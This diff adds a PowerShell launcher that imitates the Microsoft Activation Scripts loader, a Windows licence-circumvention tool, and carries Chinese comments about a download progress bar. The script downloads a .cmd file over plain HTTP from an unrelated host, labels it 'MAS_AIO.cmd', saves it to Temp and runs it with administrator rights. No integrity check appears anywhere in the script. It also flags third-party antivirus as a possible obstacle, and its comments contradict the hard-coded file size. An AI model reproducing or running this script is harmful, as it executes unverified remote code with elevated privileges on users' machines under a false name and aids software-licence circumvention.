@@ -1,0 +1,225 @@
+
+if (-not $args) {
+    Write-Host ''
+    Write-Host 'Need help? Check our homepage: ' -NoNewline
+    Write-Host 'By-Allen' -ForegroundColor Green
+    Write-Host ''
+}
+
+& {
+    $psv = (Get-Host).Version.Major
+    $troubleshoot = 'https://massgrave.dev/troubleshoot'
+
+    if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
+        $ExecutionContext.SessionState.LanguageMode
+        Write-Host "PowerShell is not running in Full Language Mode."
+        Write-Host "Help - https://gravesoft.dev/fix_powershell" -ForegroundColor White -BackgroundColor Blue
+        return
+    }
+
+    try {
+        [void][System.AppDomain]::CurrentDomain.GetAssemblies(); [void][System.Math]::Sqrt(144)
+    }
+    catch {
+        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "Powershell failed to load .NET command."
+        Write-Host "Help - https://gravesoft.dev/in-place_repair_upgrade" -ForegroundColor White -BackgroundColor Blue
+        return
+    }
+
+    function Check3rdAV {
+        $cmd = if ($psv -ge 3) { 'Get-CimInstance' } else { 'Get-WmiObject' }
+        $avList = & $cmd -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
+
+        if ($avList) {
+            Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
+            Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
+        }
+    }
+
+    function CheckFile {
+        param ([string]$FilePath)
+        if (-not (Test-Path $FilePath)) {
+            Check3rdAV
+            Write-Host "Failed to create MAS file in temp folder, aborting!"
+            Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
+            throw
+        }
+    }
+
+    # ===================== 新增：进度格式化函数（与示例代码一致） =====================
+    function Format-Size($bytes) {
+        if ($bytes -ge 1GB) {
+            return "{0:N2} GB" -f ($bytes / 1GB)
+        } elseif ($bytes -ge 1MB) {
+            return "{0:N2} MB" -f ($bytes / 1MB)
+        } elseif ($bytes -ge 1KB) {
+            return "{0:N2} KB" -f ($bytes / 1KB)
+        } else {
+            return "$bytes B"
+        }
+    }
+
+    # 修复：确保时间参数为整数，避免格式错误
+    function Format-Time($seconds) {
+        # 处理负数或无效值
+        if ($seconds -lt 0 -or [double]::IsNaN($seconds) -or [double]::IsInfinity($seconds)) {
+            return "00:00"
+        }
+        # 转换为整数秒（四舍五入）
+        $totalSeconds = [int][math]::Round($seconds)
+        $hours = [int][math]::Floor($totalSeconds / 3600)
+        $remaining = $totalSeconds % 3600
+        $minutes = [int][math]::Floor($remaining / 60)
+        $secs = [int]($remaining % 60)
+        # 确保参数都是整数，避免格式符错误
+        if ($hours -gt 0) {
+            return "{0:D2}:{1:D2}:{2:D2}" -f $hours, $minutes, $secs
+        } else {
+            return "{0:D2}:{1:D2}" -f $minutes, $secs
+        }
+    }
+    # ==================================================================================
+
+    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+
+    $URLs = @(
+        'http://win.2091k.cn/delzm/delzm.cmd'
+    )
+    
+    $errors = @()
+    $response = $null
+    # ===================== 修改：自定义目标文件大小（MAS_AIO.cmd实际约140KB，此处设为143360字节=140KB） =====================
+    $totalBytes = 3446  # 自定义文件大小（字节），可根据实际需求调整
+    $totalSize = Format-Size $totalBytes
+    # ==================================================================================
+
+    # 遍历URL重试下载（保留原随机排序逻辑）
+    foreach ($URL in $URLs | Sort-Object { Get-Random }) {
+        try {
+            # ===================== 重写：流式下载+进度计算（替换原Invoke-RestMethod/DownloadString） =====================
+            $request = [System.Net.HttpWebRequest]::Create($URL)
+            $responseObj = $request.GetResponse()
+            $stream = $responseObj.GetResponseStream()
+            $memoryStream = New-Object System.IO.MemoryStream  # 临时存储下载内容（后续转字符串）
+            
+            $buffer = New-Object byte[] 8192
+            $downloaded = 0
+            # 速度与剩余时间计算变量（与示例代码一致）
+            $lastTime = Get-Date
+            $lastDownloaded = 0
+            $currentSpeed = 0
+            $bytesPerSecond = 0
+
+            # 分段读取流并计算进度
+            while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
+                $memoryStream.Write($buffer, 0, $read)
+                $downloaded += $read
+
+                # 每0.5秒更新一次速度（避免频繁计算）
+                $currentTime = Get-Date
+                $timeDiff = ($currentTime - $lastTime).TotalSeconds
+                if ($timeDiff -ge 0.5) {
+                    $byteDiff = $downloaded - $lastDownloaded
+                    if ($timeDiff -gt 0) {
+                        $bytesPerSecond = $byteDiff / $timeDiff  # 字节/秒
+                        $currentSpeed = $bytesPerSecond / 1048576  # 转换为MB/s
+                    }
+                    $lastTime = $currentTime
+                    $lastDownloaded = $downloaded
+                }
+
+                # 计算进度百分比、已下载大小、剩余时间
+                $percent = [math]::Min([math]::Round(($downloaded / $totalBytes) * 100, 2), 100)  # 避免超100%
+                $downloadedSize = Format-Size $downloaded
+                $speedFormatted = "{0:N2} MB/s" -f $currentSpeed
+
+                # 计算剩余时间
+                $remainingBytes = $totalBytes - $downloaded
+                if ($bytesPerSecond -gt 0 -and $remainingBytes -gt 0) {
+                    $remainingSeconds = $remainingBytes / $bytesPerSecond
+                    $timeRemaining = Format-Time $remainingSeconds
+                } else {
+                    $timeRemaining = "未知"
+                }
+
+                # 显示进度（与示例代码样式一致）
+                Write-Progress -Activity "正在下载 MAS_AIO.cmd" `
+                    -Status "$downloadedSize / $totalSize  速度: $speedFormatted  剩余时间: $timeRemaining" `
+                    -PercentComplete $percent
+            }
+
+            # 下载完成：将内存流转换为字符串（还原原$response变量逻辑）
+            $memoryStream.Position = 0
+            $reader = New-Object System.IO.StreamReader($memoryStream, [System.Text.Encoding]::UTF8)
+            $response = $reader.ReadToEnd()
+
+            # 释放资源
+            $reader.Close()
+            $memoryStream.Close()
+            $stream.Close()
+            $responseObj.Close()
+            Write-Progress -Activity "正在下载 MAS_AIO.cmd" -Status "下载完成" -PercentComplete 100 -Completed
+            break  # 下载成功，退出URL循环
+            # ==================================================================================
+        }
+        catch {
+            $errors += $_
+            # 释放异常时的资源
+            if ($stream) { $stream.Close() }
+            if ($responseObj) { $responseObj.Close() }
+            Write-Progress -Activity "正在下载 MAS_AIO.cmd" -Status "下载失败，尝试下一个链接" -PercentComplete 0 -Completed
+        }
+    }
+
+    # 原下载失败处理逻辑（未修改）
+    if (-not $response) {
+        Check3rdAV
+        foreach ($err in $errors) {
+            Write-Host "Error: $($err.Exception.Message)" -ForegroundColor Red
+        }
+        Write-Host "Failed to retrieve MAS from any of the available repositories, aborting!"
+        Write-Host "Check if antivirus or firewall is blocking the connection."
+        Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
+        return
+    }
+
+
+    # Check for AutoRun registry（原逻辑未修改）
+    $paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
+    foreach ($path in $paths) { 
+        if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
+            Write-Warning "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
+        } 
+    }
+
+    # 原文件保存与运行逻辑（未修改）
+    $rand = [Guid]::NewGuid().Guid
+    $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+    $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd" }
+    Set-Content -Path $FilePath -Value "@::: $rand `r`n$response"
+    CheckFile $FilePath
+
+    $env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
+    $chkcmd = & $env:ComSpec /c "echo CMD is working"
+    if ($chkcmd -notcontains "CMD is working") {
+        Write-Warning "cmd.exe is not working.`nReport this issue at $troubleshoot"
+    }
+
+    if ($psv -lt 3) {
+        if (Test-Path "$env:SystemRoot\Sysnative") {
+            Write-Warning "Command is running with x86 Powershell, run it with x64 Powershell instead..."
+            return
+        }
+        $p = saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" -el -qedit $args""" -Verb RunAs -PassThru
+        $p.WaitForExit()
+    }
+    else {
+        saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" -el $args""" -Wait -Verb RunAs
+    }	
+    CheckFile $FilePath
+
+    # 原临时文件清理逻辑（未修改）
+    $FilePaths = @("$env:SystemRoot\Temp\MAS*.cmd", "$env:USERPROFILE\AppData\Local\Temp\MAS*.cmd")
+    foreach ($FilePath in $FilePaths) { Get-Item $FilePath -ErrorAction SilentlyContinue | Remove-Item }
+} @args
